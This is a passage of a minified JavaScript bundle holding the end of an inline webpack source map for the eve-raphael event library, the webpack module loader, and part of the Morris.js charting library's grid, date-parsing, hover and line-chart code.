m9uY2UoXCJsb2dpblwiLCBmKTtcbiAgICAgfCBldmUoXCJsb2dpblwiKTsgLy8gdHJpZ2dlcnMgZlxuICAgICB8IGV2ZShcImxvZ2luXCIpOyAvLyBubyBsaXN0ZW5lcnNcbiAgICAgKiBVc2UgQGV2ZSB0byB0cmlnZ2VyIHRoZSBsaXN0ZW5lci5cbiAgICAgKipcbiAgICAgPiBBcmd1bWVudHNcbiAgICAgKipcbiAgICAgLSBuYW1lIChzdHJpbmcpIG5hbWUgb2YgdGhlIGV2ZW50LCBkb3QgKGAuYCkgb3Igc2xhc2ggKGAvYCkgc2VwYXJhdGVkLCB3aXRoIG9wdGlvbmFsIHdpbGRjYXJkc1xuICAgICAtIGYgKGZ1bmN0aW9uKSBldmVudCBoYW5kbGVyIGZ1bmN0aW9uXG4gICAgICoqXG4gICAgID0gKGZ1bmN0aW9uKSBzYW1lIHJldHVybiBmdW5jdGlvbiBhcyBAZXZlLm9uXG4gICAgXFwqL1xuICAgIGV2ZS5vbmNlID0gZnVuY3Rpb24gKG5hbWUsIGYpIHtcbiAgICAgICAgdmFyIGYyID0gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgZXZlLm9mZihuYW1lLCBmMik7XG4gICAgICAgICAgICByZXR1cm4gZi5hcHBseSh0aGlzLCBhcmd1bWVudHMpO1xuICAgICAgICB9O1xuICAgICAgICByZXR1cm4gZXZlLm9uKG5hbWUsIGYyKTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBldmUudmVyc2lvblxuICAgICBbIHByb3BlcnR5IChzdHJpbmcpIF1cbiAgICAgKipcbiAgICAgKiBDdXJyZW50IHZlcnNpb24gb2YgdGhlIGxpYnJhcnkuXG4gICAgXFwqL1xuICAgIGV2ZS52ZXJzaW9uID0gdmVyc2lvbjtcbiAgICBldmUudG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiBcIllvdSBhcmUgcnVubmluZyBFdmUgXCIgKyB2ZXJzaW9uO1xuICAgIH07XG4gICAgKHR5cGVvZiBtb2R1bGUgIT0gXCJ1bmRlZmluZWRcIiAmJiBtb2R1bGUuZXhwb3J0cykgPyAobW9kdWxlLmV4cG9ydHMgPSBldmUpIDogKHR5cGVvZiBkZWZpbmUgPT09IFwiZnVuY3Rpb25cIiAmJiBkZWZpbmUuYW1kID8gKGRlZmluZShcImV2ZVwiLCBbXSwgZnVuY3Rpb24oKSB7IHJldHVybiBldmU7IH0pKSA6IChnbG9iLmV2ZSA9IGV2ZSkpO1xufSkodGhpcyk7XG4iXSwibWFwcGluZ3MiOiJBQUFBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFBQTtBQUNBOyIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./node_modules/eve-raphael/eve.js\n') } }, IUd = {}, JUd.m = HUd, JUd.c = IUd, JUd.d = function (t, e, n) { JUd.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: n }) }, JUd.r = function (t) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(t, "__esModule", { value: !0 }) }, JUd.t = function (e, t) { if (1 & t && (e = JUd(e)), 8 & t) return e; if (4 & t && "object" == typeof e && e && e.__esModule) return e; var n = Object.create(null); if (JUd.r(n), Object.defineProperty(n, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e) for (var i in e) JUd.d(n, i, function (t) { return e[t] }.bind(null, i)); return n }, JUd.n = function (t) { var e = t && t.__esModule ? function () { return t.default } : function () { return t }; return JUd.d(e, "a", e), e }, JUd.o = function (t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, JUd.p = "", JUd(JUd.s = "./dev/raphael.amd.js"); function JUd(t) { if (IUd[t]) return IUd[t].exports; var e = IUd[t] = { i: t, l: !1, exports: {} }; return HUd[t].call(e.exports, e, e.exports, JUd), e.l = !0, e.exports } var HUd, IUd }), function () { function t(t, e) { for (var n in e) u.call(e, n) && (t[n] = e[n]); function i() { this.constructor = t } return i.prototype = e.prototype, t.prototype = new i, t.__super__ = e.prototype, t } var A, y, e, n, i, o, a, s, r, g, l, c = [].slice, I = function (t, e) { return function () { return t.apply(e, arguments) } }, u = {}.hasOwnProperty, h = [].indexOf || function (t) { for (var e = 0, n = this.length; e < n; e++)if (e in this && this[e] === t) return e; return -1 }; function d() { } function C(t) { this.resizeHandler = I(this.resizeHandler, this); var a = this; if ("string" == typeof t.element ? this.el = A(document.getElementById(t.element)) : this.el = A(t.element), null == this.el || 0 === this.el.length) throw new Error("Graph container element not found"); "static" === this.el.css("position") && this.el.css("position", "relative"), this.options = A.extend({}, this.gridDefaults, this.defaults || {}, t), "string" == typeof this.options.units && (this.options.postUnits = t.units), this.raphael = new Raphael(this.el[0]), this.elementWidth = null, this.elementHeight = null, this.dirty = !1, this.selectFrom = null, this.init && this.init(), this.setData(this.options.data), this.el.bind("mousemove", function (t) { var e, n, i = a.el.offset(), o = t.pageX - i.left; return a.selectFrom ? (e = a.data[a.hitTest(Math.min(o, a.selectFrom))]._x, n = a.data[a.hitTest(Math.max(o, a.selectFrom))]._x - e, a.selectionRect.attr({ x: e, width: n })) : a.fire("hovermove", o, t.pageY - i.top) }), this.el.bind("mouseleave", function (t) { return a.selectFrom && (a.selectionRect.hide(), a.selectFrom = null), a.fire("hoverout") }), this.el.bind("touchstart touchmove touchend", function (t) { var e = t.originalEvent.touches[0] || t.originalEvent.changedTouches[0], n = a.el.offset(); return a.fire("hovermove", e.pageX - n.left, e.pageY - n.top) }), this.el.bind("click", function (t) { var e = a.el.offset(); return a.fire("gridclick", t.pageX - e.left, t.pageY - e.top) }), this.options.rangeSelect && (this.selectionRect = this.raphael.rect(0, 0, 0, this.el.innerHeight()).attr({ fill: this.options.rangeSelectColor, stroke: !1 }).toBack().hide(), this.el.bind("mousedown", function (t) { var e = a.el.offset(); return a.startRange(t.pageX - e.left) }), this.el.bind("mouseup", function (t) { var e = a.el.offset(); return a.endRange(t.pageX - e.left), a.fire("hovermove", t.pageX - e.left, t.pageY - e.top) })), this.options.resize && A(window).bind("resize", function (t) { return null != a.timeoutId && window.clearTimeout(a.timeoutId), a.timeoutId = window.setTimeout(a.resizeHandler, 100) }), this.el.css("-webkit-tap-highlight-color", "rgba(0,0,0,0)"), this.postInit && this.postInit() } function p(t) { null == t && (t = {}), this.options = A.extend({}, y.Hover.defaults, t), this.el = A("<div class='" + this.options.class + "'></div>"), this.el.hide(), this.options.parent.append(this.el) } function m(t) { if (this.hilight = I(this.hilight, this), this.onHoverOut = I(this.onHoverOut, this), this.onHoverMove = I(this.onHoverMove, this), this.onGridClick = I(this.onGridClick, this), !(this instanceof y.Line)) return new y.Line(t); m.__super__.constructor.call(this, t) } function f(t) { var e; if (!(this instanceof y.Area)) return new y.Area(t); e = A.extend({}, s, t), this.cumulative = !e.behaveLikeLine, "auto" === e.fillOpacity && (e.fillOpacity = e.behaveLikeLine ? .8 : 1), f.__super__.constructor.call(this, e) } function b(t) { if (this.onHoverOut = I(this.onHoverOut, this), this.onHoverMove = I(this.onHoverMove, this), this.onGridClick = I(this.onGridClick, this), !(this instanceof y.Bar)) return new y.Bar(t); b.__super__.constructor.call(this, A.extend({}, t, { parseTime: !1 })) } function B(t) { this.resizeHandler = I(this.resizeHandler, this), this.select = I(this.select, this), this.click = I(this.click, this); var e = this; if (!(this instanceof y.Donut)) return new y.Donut(t); if (this.options = A.extend({}, this.defaults, t), "string" == typeof t.element ? this.el = A(document.getElementById(t.element)) : this.el = A(t.element), null === this.el || 0 === this.el.length) throw new Error("Graph placeholder not found."); void 0 !== t.data && 0 !== t.data.length && (this.raphael = new Raphael(this.el[0]), this.options.resize && A(window).bind("resize", function (t) { return null != e.timeoutId && window.clearTimeout(e.timeoutId), e.timeoutId = window.setTimeout(e.resizeHandler, 100) }), this.setData(t.data)) } function v(t, e, n, i, o, a, s, r, g, l) { this.cx = t, this.cy = e, this.inner = n, this.outer = i, this.color = s, this.backgroundColor = r, this.index = g, this.raphael = l, this.deselect = I(this.deselect, this), this.select = I(this.select, this), this.sin_p0 = Math.sin(o), this.cos_p0 = Math.cos(o), this.sin_p1 = Math.sin(a), this.cos_p1 = Math.cos(a), this.is_long = a - o > Math.PI ? 1 : 0, this.path = this.calcSegment(this.inner + 3, this.inner + this.outer - 5), this.selectedPath = this.calcSegment(this.inner + 3, this.inner + this.outer), this.hilight = this.calcArc(this.inner) } y = window.Morris = {}, A = jQuery, y.EventEmitter = (d.prototype.on = function (t, e) { return null == this.handlers && (this.handlers = {}), null == this.handlers[t] && (this.handlers[t] = []), this.handlers[t].push(e), this }, d.prototype.fire = function () { var t, e, n, i, o, a = arguments[0], s = 2 <= arguments.length ? c.call(arguments, 1) : []; if (null != this.handlers && null != this.handlers[a]) { for (o = [], e = 0, n = (i = this.handlers[a]).length; e < n; e++)t = i[e], o.push(t.apply(null, s)); return o } }, d), y.commas = function (t) { var e, n, i, o; return null != t ? (i = t < 0 ? "-" : "", e = Math.abs(t), i += (n = Math.floor(e).toFixed(0)).replace(/(?=(?:\d{3})+$)(?!^)/g, ","), (o = e.toString()).length > n.length && (i += o.slice(n.length)), i) : "-" }, y.pad2 = function (t) { return (t < 10 ? "0" : "") + t }, y.Grid = (i = y.EventEmitter, t(C, i), C.prototype.gridDefaults = { dateFormat: null, axes: !0, grid: !0, gridLineColor: "#aaa", gridStrokeWidth: .5, gridTextColor: "#888", gridTextSize: 12, gridTextFamily: "sans-serif", gridTextWeight: "normal", hideHover: !1, yLabelFormat: null, xLabelAngle: 0, numLines: 5, padding: 25, parseTime: !0, postUnits: "", preUnits: "", ymax: "auto", ymin: "auto 0", goals: [], goalStrokeWidth: 1, goalLineColors: ["#666633", "#999966", "#cc6666", "#663333"], events: [], eventStrokeWidth: 1, eventLineColors: ["#005a04", "#ccffbb", "#3a5f0b", "#005502"], rangeSelect: null, rangeSelectColor: "#eef", resize: !1 }, C.prototype.setData = function (i, t) { var o, a, s, e, n, r, g, l, c, I, u, h, d, C, A; return null == t && (t = !0), null == (this.options.data = i) || 0 === i.length ? (this.data = [], this.raphael.clear(), void (null != this.hover && this.hover.hide())) : (h = this.cumulative ? 0 : null, d = this.cumulative ? 0 : null, 0 < this.options.goals.length && (n = Math.min.apply(Math, this.options.goals), e = Math.max.apply(Math, this.options.goals), d = null != d ? Math.min(d, n) : n, h = null != h ? Math.max(h, e) : e), this.data = function () { var t, e, n = []; for (s = t = 0, e = i.length; t < e; s = ++t)g = i[s], (r = { src: g }).label = g[this.options.xkey], this.options.parseTime ? (r.x = y.parseDate(r.label), this.options.dateFormat ? r.label = this.options.dateFormat(r.x) : "number" == typeof r.label && (r.label = new Date(r.label).toString())) : (r.x = s, this.options.xLabelFormat && (r.label = this.options.xLabelFormat(r))), c = 0, r.y = function () { var t, e, n = this.options.ykeys, i = []; for (a = t = 0, e = n.length; t < e; a = ++t)u = n[a], "string" == typeof (C = g[u]) && (C = parseFloat(C)), null != C && "number" != typeof C && (C = null), null != C && (this.cumulative ? c += C : null != h ? (h = Math.max(C, h), d = Math.min(C, d)) : h = d = C), this.cumulative && null != c && (h = Math.max(c, h), d = Math.min(c, d)), i.push(C); return i }.call(this), n.push(r); return n }.call(this), this.options.parseTime && (this.data = this.data.sort(function (t, e) { return (t.x > e.x) - (e.x > t.x) })), this.xmin = this.data[0].x, this.xmax = this.data[this.data.length - 1].x, this.events = [], 0 < this.options.events.length && (this.options.parseTime ? this.events = function () { for (var t = this.options.events, e = [], n = 0, i = t.length; n < i; n++)o = t[n], e.push(y.parseDate(o)); return e }.call(this) : this.events = this.options.events, this.xmax = Math.max(this.xmax, Math.max.apply(Math, this.events)), this.xmin = Math.min(this.xmin, Math.min.apply(Math, this.events))), this.xmin === this.xmax && (--this.xmin, this.xmax += 1), this.ymin = this.yboundary("min", d), this.ymax = this.yboundary("max", h), this.ymin === this.ymax && (d && --this.ymin, this.ymax += 1), !0 !== (A = this.options.axes) && "both" !== A && "y" !== A && !0 !== this.options.grid || (this.options.ymax === this.gridDefaults.ymax && this.options.ymin === this.gridDefaults.ymin ? (this.grid = this.autoGridLines(this.ymin, this.ymax, this.options.numLines), this.ymin = Math.min(this.ymin, this.grid[0]), this.ymax = Math.max(this.ymax, this.grid[this.grid.length - 1])) : (l = (this.ymax - this.ymin) / (this.options.numLines - 1), this.grid = function () { var t, e, n = []; for (I = t = this.ymin, e = this.ymax; 0 < l ? t <= e : e <= t; I = t += l)n.push(I); return n }.call(this))), this.dirty = !0, t ? this.redraw() : void 0) }, C.prototype.yboundary = function (t, e) { var n, i = this.options["y" + t]; return "string" == typeof i ? "auto" === i.slice(0, 4) ? 5 < i.length ? (n = parseInt(i.slice(5), 10), null == e ? n : Math[t](e, n)) : null != e ? e : 0 : parseInt(i, 10) : i }, C.prototype.autoGridLines = function (t, e, n) { var i, o, a = e - t, s = Math.floor(Math.log(a) / Math.log(10)), r = Math.pow(10, s), g = Math.floor(t / r) * r, l = Math.ceil(e / r) * r, c = (l - g) / (n - 1); return 1 === r && 1 < c && Math.ceil(c) !== c && (c = Math.ceil(c), l = g + c * (n - 1)), g < 0 && 0 < l && (g = Math.floor(t / c) * c, l = Math.ceil(e / c) * c), c < 1 ? (i = Math.floor(Math.log(c) / Math.log(10)), function () { var t, e = []; for (o = t = g; 0 < c ? t <= l : l <= t; o = t += c)e.push(parseFloat(o.toFixed(1 - i))); return e }()) : function () { var t, e = []; for (o = t = g; 0 < c ? t <= l : l <= t; o = t += c)e.push(o); return e }() }, C.prototype._calc = function () { var t, o, i, e, n, a, s = this.el.width(), r = this.el.height(); if ((this.elementWidth !== s || this.elementHeight !== r || this.dirty) && (this.elementWidth = s, this.elementHeight = r, this.dirty = !1, this.left = this.options.padding, this.right = this.elementWidth - this.options.padding, this.top = this.options.padding, this.bottom = this.elementHeight - this.options.padding, !0 !== (n = this.options.axes) && "both" !== n && "y" !== n || (e = function () { for (var t = this.grid, e = [], n = 0, i = t.length; n < i; n++)o = t[n], e.push(this.measureText(this.yAxisFormat(o)).width); return e }.call(this), this.left += Math.max.apply(Math, e)), !0 !== (a = this.options.axes) && "both" !== a && "x" !== a || (t = function () { var t, e, n = []; for (i = t = 0, e = this.data.length; 0 <= e ? t < e : e < t; i = 0 <= e ? ++t : --t)n.push(this.measureText(this.data[i].text, -this.options.xLabelAngle).height); return n }.call(this), this.bottom -= Math.max.apply(Math, t)), this.width = Math.max(1, this.right - this.left), this.height = Math.max(1, this.bottom - this.top), this.dx = this.width / (this.xmax - this.xmin), this.dy = this.height / (this.ymax - this.ymin), this.calc)) return this.calc() }, C.prototype.transY = function (t) { return this.bottom - (t - this.ymin) * this.dy }, C.prototype.transX = function (t) { return 1 === this.data.length ? (this.left + this.right) / 2 : this.left + (t - this.xmin) * this.dx }, C.prototype.redraw = function () { if (this.raphael.clear(), this._calc(), this.drawGrid(), this.drawGoals(), this.drawEvents(), this.draw) return this.draw() }, C.prototype.measureText = function (t, e) { var n, i; return null == e && (e = 0), n = (i = this.raphael.text(100, 100, t).attr("font-size", this.options.gridTextSize).attr("font-family", this.options.gridTextFamily).attr("font-weight", this.options.gridTextWeight).rotate(e)).getBBox(), i.remove(), n }, C.prototype.yAxisFormat = function (t) { return this.yLabelFormat(t) }, C.prototype.yLabelFormat = function (t) { return "function" == typeof this.options.yLabelFormat ? this.options.yLabelFormat(t) : "" + this.options.preUnits + y.commas(t) + this.options.postUnits }, C.prototype.drawGrid = function () { var t, e, n, i, o, a, s, r; if (!1 !== this.options.grid || !0 === (o = this.options.axes) || "both" === o || "y" === o) { for (r = [], n = 0, i = (a = this.grid).length; n < i; n++)t = a[n], e = this.transY(t), !0 !== (s = this.options.axes) && "both" !== s && "y" !== s || this.drawYAxisLabel(this.left - this.options.padding / 2, e, this.yAxisFormat(t)), this.options.grid ? r.push(this.drawGridLine("M" + this.left + "," + e + "H" + (this.left + this.width))) : r.push(void 0); return r } }, C.prototype.drawGoals = function () { for (var t, e, n, i = this.options.goals, o = [], a = n = 0, s = i.length; n < s; a = ++n)e = i[a], t = this.options.goalLineColors[a % this.options.goalLineColors.length], o.push(this.drawGoal(e, t)); return o }, C.prototype.drawEvents = function () { for (var t, e, n, i = this.events, o = [], a = n = 0, s = i.length; n < s; a = ++n)e = i[a], t = this.options.eventLineColors[a % this.options.eventLineColors.length], o.push(this.drawEvent(e, t)); return o }, C.prototype.drawGoal = function (t, e) { return this.raphael.path("M" + this.left + "," + this.transY(t) + "H" + this.right).attr("stroke", e).attr("stroke-width", this.options.goalStrokeWidth) }, C.prototype.drawEvent = function (t, e) { return this.raphael.path("M" + this.transX(t) + "," + this.bottom + "V" + this.top).attr("stroke", e).attr("stroke-width", this.options.eventStrokeWidth) }, C.prototype.drawYAxisLabel = function (t, e, n) { return this.raphael.text(t, e, n).attr("font-size", this.options.gridTextSize).attr("font-family", this.options.gridTextFamily).attr("font-weight", this.options.gridTextWeight).attr("fill", this.options.gridTextColor).attr("text-anchor", "end") }, C.prototype.drawGridLine = function (t) { return this.raphael.path(t).attr("stroke", this.options.gridLineColor).attr("stroke-width", this.options.gridStrokeWidth) }, C.prototype.startRange = function (t) { return this.hover.hide(), this.selectFrom = t, this.selectionRect.attr({ x: t, width: 0 }).show() }, C.prototype.endRange = function (t) { var e, n; if (this.selectFrom) return n = Math.min(this.selectFrom, t), e = Math.max(this.selectFrom, t), this.options.rangeSelect.call(this.el, { start: this.data[this.hitTest(n)].x, end: this.data[this.hitTest(e)].x }), this.selectFrom = null }, C.prototype.resizeHandler = function () { return this.timeoutId = null, this.raphael.setSize(this.el.width(), this.el.height()), this.redraw() }, C), y.parseDate = function (t) { var e, n, i, o, a, s, r, g, l, c, I; return "number" == typeof t ? t : (n = t.match(/^(\d+) Q(\d)$/), o = t.match(/^(\d+)-(\d+)$/), a = t.match(/^(\d+)-(\d+)-(\d+)$/), r = t.match(/^(\d+) W(\d+)$/), g = t.match(/^(\d+)-(\d+)-(\d+)[ T](\d+):(\d+)(Z|([+-])(\d\d):?(\d\d))?$/), l = t.match(/^(\d+)-(\d+)-(\d+)[ T](\d+):(\d+):(\d+(\.\d+)?)(Z|([+-])(\d\d):?(\d\d))?$/), n ? new Date(parseInt(n[1], 10), 3 * parseInt(n[2], 10) - 1, 1).getTime() : o ? new Date(parseInt(o[1], 10), parseInt(o[2], 10) - 1, 1).getTime() : a ? new Date(parseInt(a[1], 10), parseInt(a[2], 10) - 1, parseInt(a[3], 10)).getTime() : r ? (4 !== (c = new Date(parseInt(r[1], 10), 0, 1)).getDay() && c.setMonth(0, 1 + (4 - c.getDay() + 7) % 7), c.getTime() + 6048e5 * parseInt(r[2], 10)) : g ? g[6] ? (s = 0, "Z" !== g[6] && (s = 60 * parseInt(g[8], 10) + parseInt(g[9], 10), "+" === g[7] && (s = 0 - s)), Date.UTC(parseInt(g[1], 10), parseInt(g[2], 10) - 1, parseInt(g[3], 10), parseInt(g[4], 10), parseInt(g[5], 10) + s)) : new Date(parseInt(g[1], 10), parseInt(g[2], 10) - 1, parseInt(g[3], 10), parseInt(g[4], 10), parseInt(g[5], 10)).getTime() : l ? (I = parseFloat(l[6]), e = Math.floor(I), i = Math.round(1e3 * (I - e)), l[8] ? (s = 0, "Z" !== l[8] && (s = 60 * parseInt(l[10], 10) + parseInt(l[11], 10), "+" === l[9] && (s = 0 - s)), Date.UTC(parseInt(l[1], 10), parseInt(l[2], 10) - 1, parseInt(l[3], 10), parseInt(l[4], 10), parseInt(l[5], 10) + s, e, i)) : new Date(parseInt(l[1], 10), parseInt(l[2], 10) - 1, parseInt(l[3], 10), parseInt(l[4], 10), parseInt(l[5], 10), e, i).getTime()) : new Date(parseInt(t, 10), 0, 1).getTime()) }, y.Hover = (p.defaults = { class: "morris-hover morris-default-style" }, p.prototype.update = function (t, e, n) { return t ? (this.html(t), this.show(), this.moveTo(e, n)) : this.hide() }, p.prototype.html = function (t) { return this.el.html(t) }, p.prototype.moveTo = function (t, e) { var n, i = this.options.parent.innerWidth(), o = this.options.parent.innerHeight(), a = this.el.outerWidth(), s = this.el.outerHeight(), r = Math.min(Math.max(0, t - a / 2), i - a); return (null == e || (n = e - s - 10) < 0 && o < (n = e + 10) + s) && (n = o / 2 - s / 2), this.el.css({ left: r + "px", top: parseInt(n) + "px" }) }, p.prototype.show = function () { return this.el.show() }, p.prototype.hide = function () { return this.el.hide() }, p), y.Line = (o = y.Grid, t(m, o), m.prototype.init = function () { if ("always" !== this.options.hideHover) return this.hover = new y.Hover({ parent: this.el }), this.on("hovermove", this.onHoverMove), this.on("hoverout", this.onHoverOut), this.on("gridclick", this.onGridClick) }, m.prototype.defaults = { lineWidth: 3, pointSize: 4, lineColors: ["#0b62a4", "#7A92A3", "#4da74d", "#afd8f8", "#edc240", "#cb4b4b", "#9440ed"], pointStrokeWidths: [1], pointStrokeColors: ["#ffffff"], pointFillColors: [], smooth: !0, xLabels: "auto", xLabelFormat: null, xLabelMargin: 24, hideHover: !1 }, m.prototype.calc = function () { return this.calcPoints(), this.generatePaths() }, m.prototype.calcPoints = function () { for (var o, a, t = this.data, e = [], n = 0, i = t.length; n < i; n++)(o = t[n])._x = this.transX(o.x), o._y = function () { for (var t = o.y, e = [], n = 0, i = t.length; n < i; n++)null != (a = t[n]) ? e.push(this.transY(a)) : e.push(a); return e }.call(this), e.push(o._ymax = Math.min.apply(Math, [this.bottom].concat(function () { for (var t = o._y, e = [], n = 0, i = t.length; n < i; n++)null != (a = t[n]) && e.push(a); return e }()))); return e }, m.prototype.hitTest = function (t) { var e, n, i, o; if (0 === this.data.length) return null; for (e = n = 0, i = (o = this.data.slice(1)).length; n < i && !(t < (o[e]._x + this.data[e]._x) / 2); e = ++n); return e }, m.prototype.onGridClick = function (t, e) { var n = this.hitTest(t); return this.fire("click", n, this.data[n].src, t, e) }, m.prototype.onHoverMove = function (t, e) { var n = this.hitTest(t); return this.displayHoverForRow(n) }, m.prototype.onHoverOut = function () { if (!1 !== this.options.hideHover) return this.displayHoverForRow(null) }, m.prototype.displayHoverForRow = function (t) { var e; return null != t ? ((e = this.hover).update.apply(e, this.hoverContentForRow(t)), this.hilight(t)) : (this.hover.hide(), this.hilight()) }, m.prototype.hoverContentForRow = function (t) { for (var e, n, i = this.data[t], o = "<div class='morris-hover-row-label'>" + i.label + "</div>", a = i.y, s = n = 0, r = a.length; n < r; s = ++n)e = a[s], o += "<div class='morris-hover-point' style='color: " + this.colorFor(i, s, "label") + "'>\n  " + this.options.labels[s] + ":\n  " + this.yLabelFormat(e) + "\n</div>"; return "function" == typeof this.options.hoverCallback && (o = this.options.hoverCallback(t, this.options, o, i.src)), [o, i._x, i._ymax] }, m.prototype.generatePaths = function () { var o, a, s, r; return this.paths = function () { var t, e, n, i = []; for (a = t = 0, e = this.options.ykeys.length; 0 <= e ? t < e : e < t; a = 0 <= e ? ++t : --t)r = "boolean" == typeof this.options.smooth ? this.options.smooth : (n = this.options.ykeys[a], 0 <= h.call(this.options.smooth, n)), 1 < (o = function () { for (var t = this.data, e = [], n = 0, i = t.length; n < i; n++)void 0 !== (s = t[n])._y[a] && e.push({ x: s._x, y: s._y[a] }); return e }.call(this)).length ? i.push(y.Line.createPath(o, r, this.bottom)) : i.push(null); return i }.call(this) }, m.prototype.draw = function () { var t; if (!0 !== (t = this.options.axes) && "both" !== t && "x" !== t || this.drawXAxis(), this.drawSeries(), !1 === this.options.hideHover) return this.displayHoverForRow(this.data.length - 1) }, m.prototype.drawXAxis = function () { var t, o, e, n, i, a, s, r, g, l, c, I, u = this, h = this.bottom + this.options.padding / 2, d = null, C = null, A = this.options.parseTime ? 1 === this.data.length && "auto" === this.options.xLabels ? [[this.data[0].label, this.data[0].x]] : y.labelSeries(this.xmin, this.xmax, this.width, this.options.xLabels, this.options.xLabelFormat) 